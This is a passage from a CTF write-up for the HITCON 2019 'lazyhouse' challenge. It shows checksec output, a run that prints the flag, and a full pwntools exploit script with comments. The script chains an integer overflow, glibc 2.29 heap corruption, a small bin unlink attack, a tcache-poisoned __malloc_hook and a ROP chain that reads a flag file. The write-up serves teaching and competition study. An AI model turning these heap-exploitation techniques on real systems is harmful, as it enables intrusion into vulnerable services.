    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/CTF-archive/hitcon-2019/lazyhouse/libc.so.6'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
LOCAL PROCESS
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./lazyhouse'</span>: pid 3853
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7ff02a349000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Heap base: 0x559a1966b000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
Price:5415557892635423262
hitconctf<span class="o">{</span>congrats<span class="o">}</span><span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00
</code></pre></div></div>

<h3 id="full-exploit-script">Full exploit script</h3>

<p>My exploit script isn‚Äôt exactly Balsn‚Äôs exploit script. I modified it in some places, and also removed some stuff that wasn‚Äôt required for the exploit to function. Overall, I hope this writeup and the comments on the script help people understand how the exploit works, because it truly is amazing.</p>

<p>Big shoutout to <strong>Balsn</strong> for releasing the exploit script. I had lots of fun analysing it.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./lazyhouse'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'3.115.121.123'</span><span class="p">,</span> <span class="mi">5731</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./lazyhouse'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"LOCAL PROCESS"</span>
    <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"REMOTE PROCESS"</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_base_address</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"/proc/{}/maps"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pid</span><span class="p">),</span> <span class="s">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">"handle SIGALRM ignore</span><span class="se">\n</span><span class="s">"</span>
    <span class="n">PIE</span> <span class="o">=</span> <span class="n">get_base_address</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">script</span> <span class="o">+=</span> <span class="s">"set $_base = 0x{:x}</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">PIE</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">PIE</span><span class="o">+</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">buy</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">sell</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">upgrade</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">super_house</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'5'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
  <span class="n">debug</span><span class="p">([])</span>

<span class="k">def</span> <span class="nf">get_money</span><span class="p">():</span>
  <span class="n">payload</span> <span class="o">=</span> <span class="p">((</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">218</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>

  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

  <span class="n">sell</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">get_money</span><span class="p">()</span>

<span class="n">buy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Used to overwrite into chunk B
</span><span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x500</span><span class="p">)</span> <span class="c1"># Chunk B
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Prevent consolidation with top chunk
</span>
<span class="c1"># Sell chunk B into unsorted bin
</span><span class="n">sell</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x600</span><span class="p">)</span> <span class="c1"># Move chunk B to large bin
</span>
<span class="c1"># Overflow to turn on the IS_MMAPPED bit of chunk B
# This prevents calloc from clearing the chunk when we reallocate it
</span><span class="n">upgrade</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x513</span><span class="p">))</span>

<span class="c1"># Get chunk B back without it being zeroed out
</span><span class="n">buy</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1"># Leak libc and heap addresses
</span><span class="n">show</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x1e50d0</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x2e0</span>

<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x26542</span>
<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x26f9e</span>
<span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x12bda6</span>
<span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x47cf8</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xcf6c5</span>
<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
<span class="n">leave_ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x58373</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Heap base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>

<span class="c1"># Clear indexes 0, 1, and 2
</span><span class="n">sell</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># goes into tcache 0x80
</span><span class="n">sell</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># merges with top chunk
</span><span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># goes into tcache 0x80
</span>
<span class="c1"># Create a fake 0x230 sized chunk within a new chunk
# The target address is used to pass the unlink_chunk checks in libc 2.29
</span><span class="n">target</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x890</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x231</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>

<span class="c1"># Create enough chunks to create a 0x230 sized gap between the fake 0x230 chunk above
# and the 0x600 sized chunk below that we will consolidate backwards
</span><span class="n">buy</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'D'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>

<span class="c1"># This chunk will be freed to consolidate backwards
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x600</span><span class="p">)</span>

<span class="c1"># Set prev size to go back to the fake 0x230 chunk
# Clear prev inuse bit of the 0x600 sized chunk
</span><span class="n">upgrade</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x80</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x230</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x610</span><span class="p">))</span>

<span class="c1"># 0x600 chunk will now be freed and consolidated back to the fake 0x230 sized chunk
# Top chunk is right after this, so top chunk is consolidated all the way back too
</span><span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="c1"># Index 5 will be the 0x6c1 sized fake chunk in the payload
# Index 0 will be the 0x31 sized chunk
# Index 1 will be the 0x21 sized chunk
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x78</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6c1</span><span class="p">)</span> <span class="c1"># Index 5
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="c1"># Index 0
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c1"># Index 1
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">15</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># We put pointers to these chunks into the tcache_perthread_struct now
# This is required later when we do the small bin unlink attack
</span><span class="n">sell</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Free 0x30 sized chunk
</span><span class="n">sell</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Free 0x20 sized chunk
</span>
<span class="c1"># Consolidate backwards again
# Any new allocations following this will allow us to overwrite the metadata of any
# of the chunks from above
</span><span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="c1"># We create a chunk to go right up to the 0x20 sized chunk's fd and bk
# We must also maintain the 0x6c1 sized fake chunk here as we still have a pointer to it
# We will free the fake 0x6c1 chunk into the unsorted bin later
# It will be used to overwrite the metadata of the fake chunks from above
</span><span class="n">buy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1a0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">15</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6c1</span><span class="p">))</span>

<span class="c1"># This chunk will be right after the 0x20 sized chunk's fd and bk from above
# It will be sent into the small bin
# We will use it to perform a small bin unlink attack later
</span><span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x210</span><span class="p">)</span>

<span class="c1"># Just a filler chunk for the next chunk
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x210</span><span class="p">)</span>
<span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># Send to tcache
</span>
<span class="c1"># We need the fake 0xd1 chunk header here to be able to free the 0x6c1 chunk
# This can be calculated using gdb
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x148</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xd1</span><span class="p">))</span>
<span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># Send to tcache
</span>
<span class="c1"># Fill the 0x210 tcache bin
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
  <span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="s">'a'</span><span class="p">)</span>
  <span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="c1"># We create a fake 0x100 chunk header in the tcache_perthread_struct
# by freeing this chunk
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x3a0</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x3a0</span><span class="p">)</span>
<span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># Send to tcache
</span>
<span class="c1"># Send that initial 0x210 sized chunk into the small bin now
</span><span class="n">sell</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Send it to the unsorted bin
</span><span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x220</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x210</span><span class="p">)</span> <span class="c1"># Move it to the small bin 
</span>
<span class="n">sell</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1"># Free the fake 0x6c1 sized chunk into unsorted bin
</span>
<span class="n">smallbin</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1e4eb0</span>
<span class="n">tcache_fake_chunk</span> <span class="o">=</span> <span class="n">heap</span><span class="o">+</span><span class="mh">0x40</span> <span class="c1"># Fake chunk in the tcache_perthread_struct
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x98</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="c1"># 0x30 sized chunk pointer points here
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">tcache_fake_chunk</span><span class="p">)</span> <span class="c1"># Overwrite the fd to heapbase+0x40
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x80</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x221</span><span class="p">)</span> <span class="c1"># 0x30 sized chunk pointer points here
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">smallbin</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">tcache_fake_chunk</span><span class="p">)</span> <span class="c1"># Overwrite fd and bk, corrupt smallbin
</span><span class="n">buy</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x6b0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># Put the flag's location string at a known place on the heap
# Using gdb, the flag's location string will be at heapbase+0xa68
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'Z'</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'/home/vagrant/flag'</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># ROP to open the flag file
# Flag file's file descriptor will be 3
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0xa68</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>

<span class="c1"># ROP to read the flag file's contents right into heapbase
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>

<span class="c1"># ROP to write the contents of heapbase right into stdout
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>

<span class="n">buy</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># Overwrite the 0x210 sized chunk tcache bin with pointer to __malloc_hook
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>

<span class="c1"># Overwrite __malloc_hook with a leave; ret gadget
</span><span class="n">super_house</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">))</span> <span class="c1"># __mpn_mul_n+83
</span>
<span class="c1"># rbp is set to rsi before __malloc_hook is called in calloc
# Therefore we pass heap+0xa80 as an argument, as our ROP chain starts at
# heap+0xa88
</span><span class="n">buy</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">heap</span><span class="o">+</span><span class="mh">0xa80</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
:ET